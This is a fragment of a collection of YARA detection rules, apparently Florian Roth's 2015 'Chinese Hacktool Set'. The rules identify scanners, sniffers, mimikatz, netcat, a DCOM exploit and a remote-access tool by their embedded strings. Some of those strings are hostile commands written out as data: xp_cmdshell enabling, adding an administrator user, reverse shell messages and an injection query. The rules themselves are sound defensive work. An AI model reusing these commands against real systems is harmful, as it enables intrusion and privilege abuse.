  "ustrrefadd": "rule ustrrefadd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ustrrefadd.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b371b122460951e74094f3db3016264c9c8a0cfa\"\n\tstrings:\n\t\t$s0 = \"E-Mail  : admin@luocong.com\" fullword ascii\n\t\t$s1 = \"Homepage: http://www.luocong.com\" fullword ascii\n\t\t$s2 = \": %d  -  \" fullword ascii\n\t\t$s3 = \"ustrreffix.dll\" fullword ascii\n\t\t$s5 = \"Ultra String Reference plugin v%d.%02d\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 320KB and all of them\n}",
  "XScanLib": "rule XScanLib {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file XScanLib.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"c5cb4f75cf241f5a9aea324783193433a42a13b0\"\n\tstrings:\n\t\t$s4 = \"XScanLib.dll\" fullword ascii\n\t\t$s6 = \"Ports/%s/%d\" fullword ascii\n\t\t$s8 = \"DEFAULT-TCP-PORT\" fullword ascii\n\t\t$s9 = \"PlugCheckTcpPort\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 360KB and all of them\n}",
  "IDTools_For_WinXP_IdtTool": "rule IDTools_For_WinXP_IdtTool {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file IdtTool.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ebab6e4cb7ea82c8dc1fe4154e040e241f4672c6\"\n\tstrings:\n\t\t$s2 = \"IdtTool.sys\" fullword ascii\n\t\t$s4 = \"Idt Tool bY tMd[CsP]\" fullword wide\n\t\t$s6 = \"\\\\\\\\.\\\\slIdtTool\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 25KB and all of them\n}",
  "GoodToolset_ms11046": "rule GoodToolset_ms11046 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms11046.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"f8414a374011fd239a6c6d9c6ca5851cd8936409\"\n\tstrings:\n\t\t$s1 = \"[*] Token system command\" fullword ascii\n\t\t$s2 = \"[*] command add user 90sec 90sec\" fullword ascii\n\t\t$s3 = \"[*] Add to Administrators success\" fullword ascii\n\t\t$s4 = \"[*] User has been successfully added\" fullword ascii\n\t\t$s5 = \"Program: %s%s%s%s%s%s%s%s%s%s%s\" fullword ascii  /* Goodware String - occured 3 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 840KB and 2 of them\n}",
  "Cmdshell32": "rule Cmdshell32 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Cmdshell32.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"3c41116d20e06dcb179e7346901c1c11cd81c596\"\n\tstrings:\n\t\t$s1 = \"cmdshell.exe\" fullword wide\n\t\t$s2 = \"cmdshell\" fullword ascii\n\t\t$s3 = \"[Root@CmdShell ~]#\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 62KB and all of them\n}",
  "Sniffer_analyzer_SSClone_1210_full_version": "rule Sniffer_analyzer_SSClone_1210_full_version {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Sniffer analyzer SSClone 1210 full version.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"6882125babb60bd0a7b2f1943a40b965b7a03d4e\"\n\tstrings:\n\t\t$s0 = \"http://www.vip80000.com/hot/index.html\" fullword ascii\n\t\t$s1 = \"GetConnectString\" fullword ascii\n\t\t$s2 = \"CnCerT.Safe.SSClone.dll\" fullword ascii\n\t\t$s3 = \"(*.JPG;*.BMP;*.GIF;*.ICO;*.CUR)|*.JPG;*.BMP;*.GIF;*.ICO;*.CUR|JPG\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3580KB and all of them\n}",
  "x64_klock": "rule x64_klock {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file klock.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"44825e848bc3abdb6f31d0a49725bb6f498e9ccc\"\n\tstrings:\n\t\t$s1 = \"Bienvenue dans un processus distant\" fullword wide\n\t\t$s2 = \"klock.dll\" fullword ascii\n\t\t$s3 = \"Erreur : le bureau courant (\" fullword wide\n\t\t$s4 = \"klock de mimikatz pour Windows\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 907KB and all of them\n}",
  "Dos_Down32": "rule Dos_Down32 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Down32.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"0365738acd728021b0ea2967c867f1014fd7dd75\"\n\tstrings:\n\t\t$s2 = \"C:\\\\Windows\\\\Temp\\\\Cmd.txt\" fullword wide\n\t\t$s6 = \"down.exe\" fullword wide\n\t\t$s15 = \"get_Form1\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 137KB and all of them\n}",
  "MarathonTool_2": "rule MarathonTool_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file MarathonTool.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"75b5d25cdaa6a035981e5a33198fef0117c27c9c\"\n\tstrings:\n\t\t$s3 = \"http://localhost/retomysql/pista.aspx?id_pista=1\" fullword wide\n\t\t$s6 = \"SELECT ASCII(SUBSTR(username,{0},1)) FROM USER_USERS\" fullword wide\n\t\t$s17 = \"/Blind SQL injection tool based in heavy queries\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}",
  "Tools_termsrv": "rule Tools_termsrv {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file termsrv.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"294a693d252f8f4c85ad92ee8c618cebd94ef247\"\n\tstrings:\n\t\t$s1 = \"Iv\\\\SmSsWinStationApiPort\" fullword ascii\n\t\t$s2 = \" TSInternetUser \" fullword wide\n\t\t$s3 = \"KvInterlockedCompareExchange\" fullword ascii\n\t\t$s4 = \" WINS/DNS \" fullword wide\n\t\t$s5 = \"winerror=%1\" fullword wide\n\t\t$s6 = \"TermService \" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1150KB and all of them\n}",
  "scanms_scanms": "rule scanms_scanms {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file scanms.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"47787dee6ddea2cb44ff27b6a5fd729273cea51a\"\n\tstrings:\n\t\t$s1 = \"--- ScanMs Tool --- (c) 2003 Internet Security Systems ---\" fullword ascii\n\t\t$s2 = \"Scans for systems vulnerable to MS03-026 vuln\" fullword ascii\n\t\t$s3 = \"More accurate for WinXP/Win2k, less accurate for WinNT\" fullword ascii /* PEStudio Blacklist: os */\n\t\t$s4 = \"added %d.%d.%d.%d-%d.%d.%d.%d\" fullword ascii\n\t\t$s5 = \"Internet Explorer 1.0\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and 3 of them\n}",
  "CN_Tools_PcShare": "rule CN_Tools_PcShare {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file PcShare.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ee7ba9784fae413d644cdf5a093bd93b73537652\"\n\tstrings:\n\t\t$s0 = \"title=%s%s-%s;id=%s;hwnd=%d;mainhwnd=%d;mainprocess=%d;cmd=%d;\" fullword wide\n\t\t$s1 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\" fullword wide\n\t\t$s2 = \"http://www.pcshares.cn/pcshare200/lostpass.asp\" fullword wide\n\t\t$s5 = \"port=%s;name=%s;pass=%s;\" fullword wide\n\t\t$s16 = \"%s\\\\ini\\\\*.dat\" fullword wide\n\t\t$s17 = \"pcinit.exe\" fullword wide\n\t\t$s18 = \"http://www.pcshare.cn\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 6000KB and 3 of them\n}",
  "pw_inspector": "rule pw_inspector {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file pw-inspector.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"4f8e3e101098fc3da65ed06117b3cb73c0a66215\"\n\tstrings:\n\t\t$s1 = \"-m MINLEN  minimum length of a valid password\" fullword ascii\n\t\t$s2 = \"http://www.thc.org\" fullword ascii\n\t\t$s3 = \"Use for hacking: trim your dictionary file to the pw requirements of the target.\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 460KB and all of them\n}",
  "Dll_LoadEx": "rule Dll_LoadEx {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Dll_LoadEx.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"213d9d0afb22fe723ff570cf69ff8cdb33ada150\"\n\tstrings:\n\t\t$s0 = \"WiNrOOt@126.com\" fullword wide\n\t\t$s1 = \"Dll_LoadEx.EXE\" fullword wide\n\t\t$s3 = \"You Already Loaded This DLL ! :(\" fullword ascii\n\t\t$s10 = \"Dll_LoadEx Microsoft \" fullword wide\n\t\t$s17 = \"Can't Load This Dll ! :(\" fullword ascii\n\t\t$s18 = \"WiNrOOt\" fullword wide\n\t\t$s20 = \" Dll_LoadEx(&A)...\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 120KB and 3 of them\n}",
  "dat_report": "rule dat_report {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file report.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"4582a7c1d499bb96dad8e9b227e9d5de9becdfc2\"\n\tstrings:\n\t\t$s1 = \"<a href=\\\"http://www.xfocus.net\\\">X-Scan</a>\" fullword ascii\n\t\t$s2 = \"REPORT-ANALYSIS-OF-HOST\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 480KB and all of them\n}",
  "Dos_iis7": "rule Dos_iis7 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file iis7.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"0a173c5ece2fd4ac8ecf9510e48e95f43ab68978\"\n\tstrings:\n\t\t$s0 = \"\\\\\\\\localhost\" fullword ascii\n\t\t$s1 = \"iis.run\" fullword ascii\n\t\t$s3 = \">Could not connecto %s\" fullword ascii\n\t\t$s5 = \"WHOAMI\" ascii\n\t\t$s13 = \"WinSta0\\\\Default\" fullword ascii  /* Goodware String - occured 22 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 140KB and all of them\n}",
  "SwitchSniffer": "rule SwitchSniffer {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file SwitchSniffer.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"1e7507162154f67dff4417f1f5d18b4ade5cf0cd\"\n\tstrings:\n\t\t$s0 = \"NextSecurity.NET\" fullword wide\n\t\t$s2 = \"SwitchSniffer Setup\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and all of them\n}",
  "dbexpora": "rule dbexpora {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file dbexpora.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b55b007ef091b2f33f7042814614564625a8c79f\"\n\tstrings:\n\t\t$s0 = \"SELECT A.USER FROM SYS.USER_USERS A \" fullword ascii\n\t\t$s12 = \"OCI 8 - OCIDescriptorFree\" fullword ascii\n\t\t$s13 = \"ORACommand *\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 835KB and all of them\n}",
  "SQLCracker": "rule SQLCracker {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file SQLCracker.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"1aa5755da1a9b050c4c49fc5c58fa133b8380410\"\n\tstrings:\n\t\t$s0 = \"msvbvm60.dll\" fullword ascii /* reversed goodware string 'lld.06mvbvsm' */\n\t\t$s1 = \"_CIcos\" fullword ascii\n\t\t$s2 = \"kernel32.dll\" fullword ascii\n\t\t$s3 = \"cKmhV\" fullword ascii\n\t\t$s4 = \"080404B0\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 125KB and all of them\n}",
  "FreeVersion_debug": "rule FreeVersion_debug {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file debug.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"d11e6c6f675b3be86e37e50184dadf0081506a89\"\n\tstrings:\n\t\t$s0 = \"c:\\\\Documents and Settings\\\\Administrator\\\\\" fullword ascii\n\t\t$s1 = \"Got WMI process Pid: %d\" ascii\n\t\t$s2 = \"This exploit will execute\" ascii\n\t\t$s6 = \"Found token %s \" ascii\n\t\t$s7 = \"Running reverse shell\" ascii\n\t\t$s10 = \"wmiprvse.exe\" fullword ascii\n\t\t$s12 = \"SELECT * FROM IIsWebInfo\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 820KB and 3 of them\n}",
  "Dos_look": "rule Dos_look {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file look.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e1a37f31170e812185cf00a838835ee59b8f64ba\"\n\tstrings:\n\t\t$s1 = \"<description>CHKen QQ:41901298</description>\" fullword ascii\n\t\t$s2 = \"version=\\\"9.9.9.9\\\"\" fullword ascii\n\t\t$s3 = \"name=\\\"CH.Ken.Tool\\\"\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 40KB and all of them\n}",
  "NtGodMode": "rule NtGodMode {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file NtGodMode.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"8baac735e37523d28fdb6e736d03c67274f7db77\"\n\tstrings:\n\t\t$s0 = \"to HOST!\" fullword ascii\n\t\t$s1 = \"SS.EXE\" fullword ascii\n\t\t$s5 = \"lstrlen0\" fullword ascii\n\t\t$s6 = \"Virtual\" fullword ascii  /* Goodware String - occured 6 times */\n\t\t$s19 = \"RtlUnw\" fullword ascii /* Goodware String - occured 1 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 45KB and all of them\n}",
  "Dos_NC": "rule Dos_NC {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file NC.EXE\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"57f0839433234285cc9df96198a6ca58248a4707\"\n\tstrings:\n\t\t$s1 = \"nc -l -p port [options] [hostname] [port]\" fullword ascii\n\t\t$s2 = \"invalid connection to [%s] from %s [%s] %d\" fullword ascii\n\t\t$s3 = \"post-rcv getsockname failed\" fullword ascii\n\t\t$s4 = \"Failed to execute shell, error = %s\" fullword ascii\n\t\t$s5 = \"UDP listen needs -p arg\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 290KB and all of them\n}",
  "WebCrack4_RouterPasswordCracking": "rule WebCrack4_RouterPasswordCracking {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file WebCrack4-RouterPasswordCracking.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"00c68d1b1aa655dfd5bb693c13cdda9dbd34c638\"\n\tstrings:\n\t\t$s0 = \"http://www.site.com/test.dll?user=%USERNAME&pass=%PASSWORD\" fullword ascii\n\t\t$s1 = \"Username: \\\"%s\\\", Password: \\\"%s\\\", Remarks: \\\"%s\\\"\" fullword ascii\n\t\t$s14 = \"user:\\\"%s\\\" pass: \\\"%s\\\" result=\\\"%s\\\"\" fullword ascii\n\t\t$s16 = \"Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)\" fullword ascii\n\t\t$s20 = \"List count out of bounds (%d)+Operation not allowed on sorted string list%String\" wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 5000KB and 2 of them\n}",
  "HScan_v1_20_oncrpc": "rule HScan_v1_20_oncrpc {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file oncrpc.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e8f047eed8d4f6d2f5dbaffdd0e6e4a09c5298a2\"\n\tstrings:\n\t\t$s1 = \"clnt_raw.c - Fatal header serialization error.\" fullword ascii\n\t\t$s2 = \"svctcp_.c - cannot getsockname or listen\" fullword ascii\n\t\t$s3 = \"too many connections (%d), compilation constant FD_SETSIZE was only %d\" fullword ascii\n\t\t$s4 = \"svc_run: - select failed\" fullword ascii\n\t\t$s5 = \"@(#)bindresvport.c\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 340KB and 4 of them\n}",
  "hscan_gui": "rule hscan_gui {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hscan-gui.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"1885f0b7be87f51c304b39bc04b9423539825c69\"\n\tstrings:\n\t\t$s0 = \"Hscan.EXE\" fullword wide\n\t\t$s1 = \"RestTool.EXE\" fullword ascii\n\t\t$s3 = \"Hscan Application \" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 550KB and all of them\n}",
  "S_MultiFunction_Scanners_s": "rule S_MultiFunction_Scanners_s {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file s.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"79b60ffa1c0f73b3c47e72118e0f600fcd86b355\"\n\tstrings:\n\t\t$s0 = \"C:\\\\WINDOWS\\\\temp\\\\pojie.exe /l=\" fullword ascii\n\t\t$s1 = \"C:\\\\WINDOWS\\\\temp\\\\s.exe\" fullword ascii\n\t\t$s2 = \"C:\\\\WINDOWS\\\\temp\\\\s.exe tcp \" fullword ascii\n\t\t$s3 = \"explorer.exe http://www.hackdos.com\" fullword ascii\n\t\t$s4 = \"C:\\\\WINDOWS\\\\temp\\\\pojie.exe\" fullword ascii\n\t\t$s5 = \"Failed to read file or invalid data in file!\" fullword ascii\n\t\t$s6 = \"www.hackdos.com\" fullword ascii\n\t\t$s7 = \"WTNE / MADE BY E COMPILER - WUTAO \" fullword ascii\n\t\t$s11 = \"The interface of kernel library is invalid!\" fullword ascii\n\t\t$s12 = \"eventvwr\" fullword ascii\n\t\t$s13 = \"Failed to decompress data!\" fullword ascii\n\t\t$s14 = \"NOTEPAD.EXE result.txt\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 8000KB and 4 of them\n}",
  "Dos_GetPass": "rule Dos_GetPass {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file GetPass.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"d18d952b24110b83abd17e042f9deee679de6a1a\"\n\tstrings:\n\t\t$s0 = \"GetLogonS\" ascii\n\t\t$s3 = \"/showthread.php?t=156643\" ascii\n\t\t$s8 = \"To Run As Administ\" ascii\n\t\t$s18 = \"EnableDebugPrivileg\" fullword ascii\n\t\t$s19 = \"sedebugnameValue\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 890KB and all of them\n}",
  "update_PcMain": "rule update_PcMain {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file PcMain.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"aa68323aaec0269b0f7e697e69cce4d00a949caa\"\n\tstrings:\n\t\t$s0 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; .NET CLR 1.1.4322\" ascii\n\t\t$s1 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SvcHost\" fullword ascii\n\t\t$s2 = \"SOFTWARE\\\\Classes\\\\HTTP\\\\shell\\\\open\\\\command\" fullword ascii\n\t\t$s3 = \"\\\\svchost.exe -k \" fullword ascii\n\t\t$s4 = \"SYSTEM\\\\ControlSet001\\\\Services\\\\%s\" fullword ascii\n\t\t$s9 = \"Global\\\\%s-key-event\" fullword ascii\n\t\t$s10 = \"%d%d.exe\" fullword ascii\n\t\t$s14 = \"%d.exe\" fullword ascii\n\t\t$s15 = \"Global\\\\%s-key-metux\" fullword ascii\n\t\t$s18 = \"GET / HTTP/1.1\" fullword ascii\n\t\t$s19 = \"\\\\Services\\\\\" fullword ascii\n\t\t$s20 = \"qy001id=%d;qy001guid=%s\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and 4 of them\n}",
  "Dos_sys": "rule Dos_sys {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file sys.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b5837047443f8bc62284a0045982aaae8bab6f18\"\n\tstrings:\n\t\t$s0 = \"'SeDebugPrivilegeOpen \" fullword ascii\n\t\t$s6 = \"Author: Cyg07*2\" fullword ascii\n\t\t$s12 = \"from golds7n[LAG]'J\" fullword ascii\n\t\t$s14 = \"DAMAGE\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 150KB and all of them\n}",
  "dat_xpf": "rule dat_xpf {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xpf.sys\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"761125ab594f8dc996da4ce8ce50deba49c81846\"\n\tstrings:\n\t\t$s1 = \"UnHook IoGetDeviceObjectPointer ok!\" fullword ascii\n\t\t$s2 = \"\\\\Device\\\\XScanPF\" fullword wide\n\t\t$s3 = \"\\\\DosDevices\\\\XScanPF\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 25KB and all of them\n}",
  "Project1": "rule Project1 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Project1.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"d1a5e3b646a16a7fcccf03759bd0f96480111c96\"\n\tstrings:\n\t\t$s1 = \"EXEC master.dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll'\" fullword ascii\n\t\t$s2 = \"Password.txt\" fullword ascii\n\t\t$s3 = \"LoginPrompt\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 5000KB and all of them\n}",
  "Arp_EMP_v1_0": "rule Arp_EMP_v1_0 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Arp EMP v1.0.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ae4954c142ad1552a2abaef5636c7ef68fdd99ee\"\n\tstrings:\n\t\t$s0 = \"Arp EMP v1.0.exe\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 800KB and all of them\n}",
  "CN_Tools_MyUPnP": "rule CN_Tools_MyUPnP {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file MyUPnP.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"15b6fca7e42cd2800ba82c739552e7ffee967000\"\n\tstrings:\n\t\t$s1 = \"<description>BYTELINKER.COM</description>\" fullword ascii\n\t\t$s2 = \"myupnp.exe\" fullword ascii\n\t\t$s3 = \"LOADER ERROR\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1500KB and all of them\n}",
  "CN_Tools_Shiell": "rule CN_Tools_Shiell {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Shiell.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b432d80c37abe354d344b949c8730929d8f9817a\"\n\tstrings:\n\t\t$s1 = \"C:\\\\Users\\\\Tong\\\\Documents\\\\Visual Studio 2012\\\\Projects\\\\Shift shell\" ascii\n\t\t$s2 = \"C:\\\\Windows\\\\System32\\\\Shiell.exe\" fullword wide\n\t\t$s3 = \"Shift shell.exe\" fullword wide\n\t\t$s4 = \"\\\" /v debugger /t REG_SZ /d \\\"\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1500KB and 2 of them\n}",
  "cndcom_cndcom": "rule cndcom_cndcom {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file cndcom.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"08bbe6312342b28b43201125bd8c518531de8082\"\n\tstrings:\n\t\t$s1 = \"- Rewritten by HDM last <hdm [at] metasploit.com>\" fullword ascii\n\t\t$s2 = \"- Usage: %s <Target ID> <Target IP>\" fullword ascii\n\t\t$s3 = \"- Remote DCOM RPC Buffer Overflow Exploit\" fullword ascii\n\t\t$s4 = \"- Warning:This Code is more like a dos tool!(Modify by pingker)\" fullword ascii\n\t\t$s5 = \"Windows NT SP6 (Chinese)\" fullword ascii\n\t\t$s6 = \"- Original code by FlashSky and Benjurry\" fullword ascii\n\t\t$s7 = \"\\\\C$\\\\123456111111111111111.doc\" fullword wide\n\t\t$s8 = \"shell3all.c\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}",
  "IsDebug_V1_4": "rule IsDebug_V1_4 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file IsDebug V1.4.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ca32474c358b4402421ece1cb31714fbb088b69a\"\n\tstrings:\n\t\t$s0 = \"IsDebug.dll\" fullword ascii\n\t\t$s1 = \"SV Dumper V1.0\" fullword wide\n\t\t$s2 = \"(IsDebuggerPresent byte Patcher)\" fullword ascii\n\t\t$s8 = \"Error WriteMemory failed\" fullword ascii\n\t\t$s9 = \"IsDebugPresent\" fullword ascii\n\t\t$s10 = \"idb_Autoload\" fullword ascii\n\t\t$s11 = \"Bin Files\" fullword ascii\n\t\t$s12 = \"MASM32 version\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 30KB and all of them\n}",
  "HTTPSCANNER": "rule HTTPSCANNER {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file HTTPSCANNER.EXE\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ae2929346944c1ea3411a4562e9d5e2f765d088a\"\n\tstrings:\n\t\t$s1 = \"HttpScanner.exe\" fullword wide\n\t\t$s2 = \"HttpScanner\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3500KB and all of them\n}",
